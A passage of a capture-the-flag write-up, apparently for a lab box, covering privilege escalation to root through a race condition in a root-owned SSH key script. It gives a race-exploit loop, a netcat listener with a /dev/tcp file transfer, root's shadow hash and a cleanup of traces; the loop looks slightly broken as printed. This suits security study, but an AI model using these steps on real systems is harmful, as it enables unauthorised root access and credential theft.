+uid=1001(neil) gid=1001(neil) groups=1001(neil)</span></span></span></code></pre></li><li id="https://www.notion.so/4e5269faa05c4191856a384499754294" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/a126bf12c3e841bd9e6368727041b0fb" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/a126bf12c3e841bd9e6368727041b0fb"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/50c4587c742b42c7a9aa953baee052a1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Check sudo permissions:</span></span><div id="https://www.notion.so/a1c87fa2f1c64fdd8ee2e7e40549320e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo -l</code></span></span></p></div><pre id="https://www.notion.so/31ec04f9233748519f74d2fe7a1ec392" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>User neil may run the following commands on tenet:
+(ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh</span></span></span></code></pre></li><li id="https://www.notion.so/790409181da6444dbd9b60f235a82ab1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Neil can run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enableSSH.sh</code></span><span class="SemanticString"> as root without password.</span></span></li><li id="https://www.notion.so/d70926fe78164dfdbaef2eb710f1394b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Usually, a privileged script like this can be leveraged to execute arbitrary privileged code, but in this case, the file is owned by root and we cannot modify it as neil.</span></span></li><li id="https://www.notion.so/f4143b36193141e896a0e19c53d73960" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Reading the contents of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enableSSH.sh</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/db66bbe9c7654eae8d7ae41139cb165f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token function-name function">checkAdded</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+	<span class="token assign-left variable">sshName</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/bin/echo $key <span class="token operator">|</span> /usr/bin/cut -d <span class="token string">" "</span> -f <span class="token number">3</span><span class="token variable">)</span></span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> -z <span class="token variable"><span class="token variable">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span class="token variable">)</span></span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+
+		/bin/echo <span class="token string">"Successfully added <span class="token variable">$sshName</span> to authorized_keys file!"</span>
+
+	<span class="token keyword">else</span>
+
+		/bin/echo <span class="token string">"Error in adding <span class="token variable">$sshName</span> to authorized_keys file!"</span>
+
+	<span class="token keyword">fi</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token function-name function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> -s <span class="token variable">$1</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> -f <span class="token variable">$1</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+
+		/bin/echo <span class="token string">"Error in creating key file!"</span>
+
+		<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> -f <span class="token variable">$1</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> /bin/rm <span class="token variable">$1</span><span class="token punctuation">;</span> <span class="token keyword">fi</span>
+
+		<span class="token builtin class-name">exit</span> <span class="token number">1</span>
+
+	<span class="token keyword">fi</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token function-name function">addKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+	<span class="token assign-left variable">tmpName</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="token variable">)</span></span>
+
+	<span class="token punctuation">(</span>umask <span class="token number">110</span><span class="token punctuation">;</span> <span class="token function">touch</span> <span class="token variable">$tmpName</span><span class="token punctuation">)</span>
+
+	/bin/echo <span class="token variable">$key</span> <span class="token operator">>></span><span class="token variable">$tmpName</span>
+
+	checkFile <span class="token variable">$tmpName</span>
+
+	/bin/cat <span class="token variable">$tmpName</span> <span class="token operator">>></span>/root/.ssh/authorized_keys
+
+	/bin/rm <span class="token variable">$tmpName</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token assign-left variable">key</span><span class="token operator">=</span><span class="token string">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
+addKey
+checkAdded</span></span></span></code></pre></li><li id="https://www.notion.so/6a6ea96768b94cb28c2d33cf5927f46b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The script is used to add keys to the root user&#x27;s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString"> file, and makes use of a temp file to store the key before appending to it.</span></span></li><li id="https://www.notion.so/916868cb56774c4388ce154018dd888e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This method of updating the SSH keys is vulnerable to a race condition attack, as the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$key</code></span><span class="SemanticString"> variable is passed around several times, before the temp file is appended to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/69f6f79b80874d1d99b32986da7763a4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This means we can swap in our own SSH public key immediately within the timeframe of the key being copied to the temp file and the file concatenated to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">, to grant ourselves SSH access to root.</span></span></li><li id="https://www.notion.so/4a31161a53df41febffcf7e3df6b0231" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create a simple script </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rc.sh</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/a1d06111acc14c0d8b9988856d17c78c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">while</span> <span class="token boolean">true</span>
+<span class="token keyword">do</span>
+<span class="token builtin class-name">echo</span> /tmp/id_rsa.pub <span class="token operator">|</span> <span class="token function">tee</span> /tmp/ssh-*</span></span></span></code></pre></li><li id="https://www.notion.so/01ea47b2ffb644309500dd84b2775558" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Send our public SSH key to the target machine:</span></span><div id="https://www.notion.so/65b71deea37246b58febc8ba47e28f60" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969 &gt; /tmp/id_rsa.pub &lt; /dev/null</code></span></span></p></div><div id="https://www.notion.so/ff3e48c58518439ba19895cb9fd53274" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat ~/.ssh/id_rsa.pub &gt; /dev/tcp/10.10.10.223/6969</code></span></span></p></div></li><li id="https://www.notion.so/9671d318051344a0b3552fe41eea2c1b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Make the exploit script executable:</span></span><div id="https://www.notion.so/6dc4c8565fa94620b0db540a2d046cb2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod +x rc.sh</code></span></span></p></div></li><li id="https://www.notion.so/47facc7f1076464493296d53451a0a2d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Open a second SSH session, and run the exploit script. At the same time, on the primary session, execute </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enableSSH.sh</code></span><span class="SemanticString"> for a few times.</span></span></li><li id="https://www.notion.so/78b3ff06f0ca4d0fa52677883a4fee0b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">If the race condition attack succeeded, our public key should now be in the root user&#x27;s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString"> file, and we can simply SSH in as root:</span></span><div id="https://www.notion.so/e293e52783f945af9635b2f93b6abe8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh root@10.10.10.223</code></span></span></p></div></li><li id="https://www.notion.so/d601c340f78f403481bc996012540bdf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">No password was prompted, and we have successfully logged in as root.</span></span><div id="https://www.notion.so/df748ab564954d0db5547398014fbb9b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/1f67cc0dd104483580106d849aa66f4a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre></li><li id="https://www.notion.so/6bbd7961b3024ce2a8050e0ec49eb07c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/6ef7911709ae46dea89f3fdaeac82980" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/6ef7911709ae46dea89f3fdaeac82980"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/9ecec976d9e84c6789b001ef33d8316d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root user&#x27;s hash from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/97ffd956092443ed975f03b35944d356" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$6$hfxS53gy$YDGYBt.0P7G3TpKB0qo.gkUNClP2CRMHyCNU/2aVjQSPN3mxpL4hs7XYX1XNM5mSEGiASvizwxTV0DToS/wDV.:18606:0:99999:7:::</span></span></span></code></pre></li><li id="https://www.notion.so/030f23c4a3cb4e43ab8ba20da90b3f01" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Clean up after ourselves and delete any residual files:</span></span><div id="https://www.notion.so/59d45fb3403f44d3aa296d006596a976" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ rm /tmp/id_rsa.pub /tmp/rc.sh</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/2e5159d091a742f78f3b6d7d8f99e9c7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2e5159d091a742f78f3b6d7d8f99e9c7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/8701c2a3521a4464b96df498b332aa64" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a</a></span></span></li><li id="https://www.notion.so/45428d07256e4c1ea8946c234ed1d52a" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a></span></span></li><li id="https://www.notion.so/6fdeffaaa4d84b92931003395bee40b3" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/pentesting-web/deserialization">https://book.hacktricks.xyz/pentesting-web/deserialization</a></span></span></li><li id="https://www.notion.so/eda36b4eaa8848eea65838d307f1d308" class="NumberedList" value="4"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://serverpilot.io/docs/where-to-find-your-database-credentials-in-wordpress/">https://serverpilot.io/docs/where-to-find-your-database-credentials-in-wordpress/</a></span></span></li><li id="https://www.notion.so/0d3697e2639547d8b8547c0cf86dd5bc" class="NumberedList" value="5"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf">http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf</a></span></span></li></ol></article>
+  <footer class="Footer">
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
+</body>
+
+</html>
